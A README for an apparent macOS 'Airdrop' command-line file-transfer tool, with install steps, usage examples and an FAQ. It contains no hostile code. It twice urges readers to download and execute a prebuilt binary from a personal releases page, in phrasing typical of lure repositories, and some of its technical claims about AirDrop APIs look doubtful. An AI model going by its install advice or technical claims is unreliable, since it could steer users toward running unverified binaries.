[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/murali90198/airdrop/releases)

# Airdrop CLI — Native macOS AirDrop Command-Line Utility

🚀 📡 📂 🖥️

Airdrop is a compact command-line utility that controls Apple AirDrop from the terminal. It targets macOS developers, automation engineers, and power users who want file transfer in scripts, CI jobs, and shortcuts. The tool uses native macOS APIs and Swift to keep behavior consistent with system AirDrop.

Badges
- [![Swift](https://img.shields.io/badge/Swift-5.7-orange?logo=swift)](https://swift.org)
- ![macOS](https://img.shields.io/badge/macOS-native-lightgrey)
- ![CLI](https://img.shields.io/badge/CLI-tool-blue)
- ![Open Source](https://img.shields.io/badge/Open%20Source-available-green)

Hero image
![AirDrop concept](https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=1200&q=80)

Table of contents
- Features
- Requirements
- Install
- Quick start
- Examples
- CLI reference
- Scripting and automation
- Architecture
- Development
- Contributing
- FAQ
- License
- Changelog

Features
- Native integration with macOS AirDrop APIs (Cocoa + Multipeer Connectivity).
- One binary, no runtime dependencies.
- Send single files, multiple files, or folders.
- Discover nearby devices, list peers, and target a device by name or ID.
- Batch mode for scripted transfers.
- Exit codes for automation and CI.
- Verbose mode for logs and debug output.

Requirements
- macOS 11.0 or later.
- Swift toolchain (for building from source).
- Terminal with network and Bluetooth access enabled for the user session.
- If you use the prebuilt release, you may need to allow the binary to run in System Preferences > Security & Privacy.

Install

Prebuilt release (recommended)
- Download the release file from https://github.com/murali90198/airdrop/releases. The release file needs to be downloaded and executed.
- Use Finder to open the downloaded archive and move the binary to /usr/local/bin or another directory on your PATH.
- Make the binary executable:
  chmod +x /usr/local/bin/airdrop

Homebrew (example)
- Add a tap or install from a formula if available:
  brew tap murali90198/airdrop
  brew install airdrop

Build from source
- Clone the repo and use Swift Package Manager:
  git clone https://github.com/murali90198/airdrop.git
  cd airdrop
  swift build -c release
- The built binary will appear at .build/release/airdrop. Move it to a PATH folder.

Quick start

Discover peers
- Scan for nearby devices:
  airdrop discover --timeout 10
- The command prints device names and a short ID.

Send a file
- Send a file to a device by name:
  airdrop send --to "John’s MacBook" /path/to/file.zip

Send multiple files
- Send several files or a folder:
  airdrop send --to "iPad" /path/to/file1.jpg /path/to/folder

Batch mode
- Send files in a loop and check exit code:
  for f in *.png; do airdrop send --to "Work iMac" "$f"; done

Examples

Send and confirm
- Send a file and wait for confirmation:
  airdrop send --to "Design Mac" --wait /tmp/report.pdf
- The command returns 0 when transfer completes, non-zero on error.

List peers with JSON output
- Use machine-readable output for scripts:
  airdrop discover --json > peers.json

Automate in a CI job
- Use batch mode plus exit codes to gate steps in CI pipelines:
  airdrop send --to "Build Server" ./artifact.tar.gz
  if [ $? -ne 0 ]; then
    echo "Transfer failed"
    exit 1
  fi

CLI reference

Global options
- --help, -h: Show help.
- --version, -v: Print version.
- --verbose: Print debug logs.
- --json: Output machine-readable JSON.

discover command
- airdrop discover [--timeout N] [--json]
- timeout: seconds to scan for peers.
- json: output peers in JSON array.

send command
- airdrop send --to <device-name-or-id> [--wait] [--retry N] <path>...
- --to: target device name or ID from discover.
- --wait: block until transfer finishes and return status.
- --retry: number of retry attempts on failure.

exit codes
- 0: success
- 1: generic error
- 2: device not found
- 3: transfer refused
- 4: transfer timed out

Scripting and automation

Use JSON output to feed scripts
- Call discover with --json and parse with jq or Python to pick a device:
  device=$(airdrop discover --json | jq -r '.[0].id')
  airdrop send --to "$device" ./package.dmg

Silent transfers in automation
- Use --verbose off and log files:
  airdrop send --to "QA Mac" ./build.zip > /var/log/airdrop.log 2>&1

Error handling
- Check exit codes after every transfer.
- On code 3 (refused), retry with --retry or alert the user.

Integration points
- Use airdrop in automation scripts, Makefiles, or launchd tasks.
- Invoke from Swift or Python with Process/ subprocess modules.

Architecture

Core
- The utility calls macOS frameworks directly (MultipeerConnectivity and CoreBluetooth where required). It does not spawn UI components.

Binary
- One static binary built with Swift Package Manager and linked to standard system frameworks.

Security
- The tool uses the same system-level permissions as native AirDrop. The app must request local network and Bluetooth permissions when required. Codesign and notarize the binary for smoother Gatekeeper behavior.

Logging
- The binary writes logs to stdout. In verbose mode it prints detailed transfer stages and network events.

Development

Repository layout
- Sources/: Swift source files.
- Tests/: Unit tests.
- Package.swift: Swift package manifest.

Build
- swift build -c release
- swift test to run unit tests.

Run tests
- Unit tests use XCTest.
- Mock network layers for fast CI runs.

Code style
- Follow Swift API Design Guidelines.
- Keep functions short and focused.
- Use clear error types and enums for exit codes.

Debugging tips
- Use --verbose to see connection events.
- Use system logs to check for macOS-level errors:
  log show --predicate 'process == "airdrop"' --last 1h

Contributing

How to contribute
- Fork the repo, create a topic branch, and open a pull request.
- Write tests for new features.
- Document new commands in the README.

Reporting issues
- Open an issue with reproducible steps, logs, and macOS version.

Feature ideas
- Add a GUI helper wrapper.
- Integrate with Finder services.
- Support pairing by QR code.

Code of conduct
- Be respectful and keep interactions professional.
- Follow standard open source norms.

FAQ

Q: Will this replace system AirDrop?
A: No. The tool exposes AirDrop functions via CLI. It uses system APIs and respects system policies.

Q: Do I need to grant special permissions?
A: macOS may ask for Bluetooth and local network access. Grant access if prompted.

Q: Can I use this on older macOS?
A: The binary targets macOS 11 and later. Building on older SDKs may need tweaks.

Q: I downloaded a release. How do I run it?
A: Download the release file from https://github.com/murali90198/airdrop/releases. The release file needs to be downloaded and executed. Place the binary in a directory on your PATH and run airdrop --help.

Q: I see a transfer error. What now?
- Check verbose output.
- Confirm the target device is discoverable and within range.
- Confirm Bluetooth and Wi-Fi are on.

License
- MIT License. See LICENSE file in the repo.

Changelog
- See GitHub Releases for tagged binaries and release notes:
  https://github.com/murali90198/airdrop/releases

Contact
- Open issues for bugs and feature requests.
- Use pull requests for code changes.